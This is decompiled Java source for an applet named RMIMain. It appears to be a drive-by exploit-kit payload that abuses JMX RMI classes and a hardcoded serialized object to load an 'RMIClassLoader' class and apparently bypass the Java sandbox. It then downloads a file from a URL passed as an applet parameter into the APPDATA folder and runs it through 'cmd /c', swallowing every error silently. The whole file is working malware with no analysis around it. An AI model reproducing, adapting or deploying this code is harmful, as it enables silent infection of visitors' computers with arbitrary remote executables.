import java.io.ByteArrayInputStream;
import javax.management.remote.rmi.RMIConnection;
import java.rmi.Remote;
import javax.management.OperationsException;
import java.io.ObjectInputStream;
import javax.management.loading.ClassLoaderRepository;
import javax.management.IntrospectionException;
import javax.management.MBeanInfo;
import java.util.Set;
import javax.management.QueryExp;
import javax.management.NotCompliantMBeanException;
import javax.management.InstanceAlreadyExistsException;
import javax.management.ObjectInstance;
import javax.management.ListenerNotFoundException;
import javax.management.NotificationFilter;
import javax.management.NotificationListener;
import javax.management.MBeanException;
import javax.management.InvalidAttributeValueException;
import javax.management.AttributeNotFoundException;
import javax.management.Attribute;
import javax.management.ReflectionException;
import javax.management.AttributeList;
import javax.management.MBeanRegistrationException;
import javax.management.InstanceNotFoundException;
import javax.management.MBeanServer;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URLConnection;
import javax.management.remote.rmi.RMIServerImpl;
import java.rmi.MarshalledObject;
import java.net.URL;
import javax.management.ObjectName;
import java.util.Map;
import javax.security.auth.Subject;
import javax.management.remote.rmi.RMIConnectionImpl;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class RMIMain extends Applet
{
    private static final long serialVersionUID = 2205862970052148546L;
    
    @Override
    public void init() {
        try {
            final MarshalledObject params = this.getResource();
            final RMIServerImpl impl = this.getRMIServerImpl();
            impl.setMBeanServer(this.getMbeanServer());
            final RMIConnectionImpl connectionImpl = new RMIConnectionImpl(impl, "javarmi", null, null, null);
            connectionImpl.createMBean("RMIClassLoader", null, null, params, null, null);
        }
        catch (Exception e) {
            try {
                try {
                    RMIClassLoader.instance.LoadSecurityManager();
                    final String fileName = this.getParameter("F");
                    final String tempFolder = System.getenv("APPDATA");
                    final URL myURL = new URL(this.getParameter("U"));
                    final URLConnection myURLConnection = this.OpenConnection(myURL);
                    final InputStream myInputStream = this.GetInputStream(myURLConnection);
                    final FileOutputStream myFileOutputStream = this.GetOutputStream(tempFolder + "\\" + fileName);
                    final byte[] myData = new byte[512];
                    int readLength;
                    while ((readLength = myInputStream.read(myData, 0, myData.length)) != -1) {
                        myFileOutputStream.write(myData, 0, readLength);
                    }
                    myInputStream.close();
                    myFileOutputStream.close();
                    this.Execute(tempFolder + "\\" + fileName);
                }
                catch (Exception ex) {}
            }
            catch (Exception ex2) {}
        }
    }
    
    public URLConnection OpenConnection(final URL myURL) {
        try {
            final URLConnection myURLConnection = myURL.openConnection();
            return myURLConnection;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public InputStream GetInputStream(final URLConnection myURLConnection) {
        try {
            final InputStream myInputStream = myURLConnection.getInputStream();
            return myInputStream;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public FileOutputStream GetOutputStream(final String FileName) {
        try {
            final FileOutputStream myFileOutputStream = new FileOutputStream(FileName);
            return myFileOutputStream;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public void Execute(final String name) {
        try {
            final Runtime t = Runtime.getRuntime();
            t.exec("cmd /c \"" + name + "\"");
        }
        catch (Exception e) {}
    }
    
    private MBeanServer getMbeanServer() {
        return new MBeanServer() {
            @Override
            public void unregisterMBean(final ObjectName name) throws InstanceNotFoundException, MBeanRegistrationException {
            }
            
            @Override
            public AttributeList setAttributes(final ObjectName name, final AttributeList attributes) throws InstanceNotFoundException, ReflectionException {
                return null;
            }
            
            @Override
            public void setAttribute(final ObjectName name, final Attribute attribute) throws InstanceNotFoundException, AttributeNotFoundException, InvalidAttributeValueException, MBeanException, ReflectionException {
            }
            
            @Override
            public void removeNotificationListener(final ObjectName name, final NotificationListener listener, final NotificationFilter filter, final Object handback) throws InstanceNotFoundException, ListenerNotFoundException {
            }
            
            @Override
            public void removeNotificationListener(final ObjectName name, final ObjectName listener, final NotificationFilter filter, final Object handback) throws InstanceNotFoundException, ListenerNotFoundException {
            }
            
            @Override
            public void removeNotificationListener(final ObjectName name, final NotificationListener listener) throws InstanceNotFoundException, ListenerNotFoundException {
            }
            
            @Override
            public void removeNotificationListener(final ObjectName name, final ObjectName listener) throws InstanceNotFoundException, ListenerNotFoundException {
            }
            
            @Override
            public ObjectInstance registerMBean(final Object object, final ObjectName name) throws InstanceAlreadyExistsException, MBeanRegistrationException, NotCompliantMBeanException {
                return null;
            }
            
            @Override
            public Set<ObjectName> queryNames(final ObjectName name, final QueryExp query) {
                return null;
            }
            
            @Override
            public Set<ObjectInstance> queryMBeans(final ObjectName name, final QueryExp query) {
                return null;
            }
            
            @Override
            public boolean isRegistered(final ObjectName name) {
                return false;
            }
            
            @Override
            public boolean isInstanceOf(final ObjectName name, final String className) throws InstanceNotFoundException {
                return false;
            }
            
            @Override
            public Object invoke(final ObjectName name, final String operationName, final Object[] params, final String[] signature) throws InstanceNotFoundException, MBeanException, ReflectionException {
                return null;
            }
            
            @Override
            public Object instantiate(final String className, final ObjectName loaderName, final Object[] params, final String[] signature) throws ReflectionException, MBeanException, InstanceNotFoundException {
                return null;
            }
            
            @Override
            public Object instantiate(final String className, final Object[] params, final String[] signature) throws ReflectionException, MBeanException {
                return null;
            }
            
            @Override
            public Object instantiate(final String className, final ObjectName loaderName) throws ReflectionException, MBeanException, InstanceNotFoundException {
                return null;
            }
            
            @Override
            public Object instantiate(final String className) throws ReflectionException, MBeanException {
                return null;
            }
            
            @Override
            public ObjectInstance getObjectInstance(final ObjectName name) throws InstanceNotFoundException {
                return null;
            }
            
            @Override
            public MBeanInfo getMBeanInfo(final ObjectName name) throws InstanceNotFoundException, IntrospectionException, ReflectionException {
                return null;
            }
            
            @Override
            public Integer getMBeanCount() {
                return null;
            }
            
            @Override
            public String[] getDomains() {
                return null;
            }
            
            @Override
            public String getDefaultDomain() {
                return null;
            }
            
            @Override
            public ClassLoaderRepository getClassLoaderRepository() {
                return new ClassLoaderRepository() {
                    @Override
                    public Class<?> loadClassWithout(final ClassLoader exclude, final String className) throws ClassNotFoundException {
                        return null;
                    }
                    
                    @Override
                    public Class<?> loadClassBefore(final ClassLoader stop, final String className) throws ClassNotFoundException {
                        return null;
                    }
                    
                    @Override
                    public Class<?> loadClass(final String className) throws ClassNotFoundException {
                        return null;
                    }
                };
            }
            
            @Override
            public ClassLoader getClassLoaderFor(final ObjectName mbeanName) throws InstanceNotFoundException {
                return null;
            }
            
            @Override
            public ClassLoader getClassLoader(final ObjectName loaderName) throws InstanceNotFoundException {
                return null;
            }
            
            @Override
            public AttributeList getAttributes(final ObjectName name, final String[] attributes) throws InstanceNotFoundException, ReflectionException {
                return null;
            }
            
            @Override
            public Object getAttribute(final ObjectName name, final String attribute) throws MBeanException, AttributeNotFoundException, InstanceNotFoundException, ReflectionException {
                return null;
            }
            
            @Override
            public ObjectInputStream deserialize(final String className, final ObjectName loaderName, final byte[] data) throws InstanceNotFoundException, OperationsException, ReflectionException {
                return null;
            }
            
            @Override
            public ObjectInputStream deserialize(final String className, final byte[] data) throws OperationsException, ReflectionException {
                return null;
            }
            
            @Override
            public ObjectInputStream deserialize(final ObjectName name, final byte[] data) throws InstanceNotFoundException, OperationsException {
                return null;
            }
            
            @Override
            public ObjectInstance createMBean(final String className, final ObjectName name, final ObjectName loaderName, final Object[] params, final String[] signature) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException {
                return null;
            }
            
            @Override
            public ObjectInstance createMBean(final String className, final ObjectName name, final Object[] params, final String[] signature) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException {
                return null;
            }
            
            @Override
            public ObjectInstance createMBean(final String className, final ObjectName name, final ObjectName loaderName) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException {
                return null;
            }
            
            @Override
            public ObjectInstance createMBean(final String className, final ObjectName name) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException {
                return null;
            }
            
            @Override
            public void addNotificationListener(final ObjectName name, final ObjectName listener, final NotificationFilter filter, final Object handback) throws InstanceNotFoundException {
            }
            
            @Override
            public void addNotificationListener(final ObjectName name, final NotificationListener listener, final NotificationFilter filter, final Object handback) throws InstanceNotFoundException {
            }
        };
    }
    
    private RMIServerImpl getRMIServerImpl() {
        return new RMIServerImpl(null) {
            @Override
            public Remote toStub() throws IOException {
                return null;
            }
            
            @Override
            protected RMIConnection makeClient(final String connectionId, final Subject subject) throws IOException {
                return null;
            }
            
            @Override
            protected String getProtocol() {
                return null;
            }
            
            @Override
            protected void export() throws IOException {
            }
            
            @Override
            protected void closeServer() throws IOException {
            }
            
            @Override
            protected void closeClient(final RMIConnection client) throws IOException {
            }
        };
    }
    
    public MarshalledObject getResource() throws IOException, ClassNotFoundException {
        final byte[] rmi = { -84, -19, 0, 5, 115, 114, 0, 25, 106, 97, 118, 97, 46, 114, 109, 105, 46, 77, 97, 114, 115, 104, 97, 108, 108, 101, 100, 79, 98, 106, 101, 99, 116, 124, -67, 30, -105, -19, 99, -4, 62, 2, 0, 3, 73, 0, 4, 104, 97, 115, 104, 91, 0, 8, 108, 111, 99, 66, 121, 116, 101, 115, 116, 0, 2, 91, 66, 91, 0, 8, 111, 98, 106, 66, 121, 116, 101, 115, 113, 0, 126, 0, 1, 120, 112, -30, -70, 124, 123, 112, 117, 114, 0, 2, 91, 66, -84, -13, 23, -8, 6, 8, 84, -32, 2, 0, 0, 120, 112, 0, 0, 0, 36, -84, -19, 0, 5, 115, 114, 0, 14, 82, 77, 73, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 127, 30, -15, -22, -70, -116, 125, -63, 3, 0, 0, 120, 112, 120 };
        final ByteArrayInputStream f = new ByteArrayInputStream(rmi);
        final ObjectInputStream stream = new ObjectInputStream(f);
        final MarshalledObject object = (MarshalledObject)stream.readObject();
        stream.close();
        return object;
    }
}
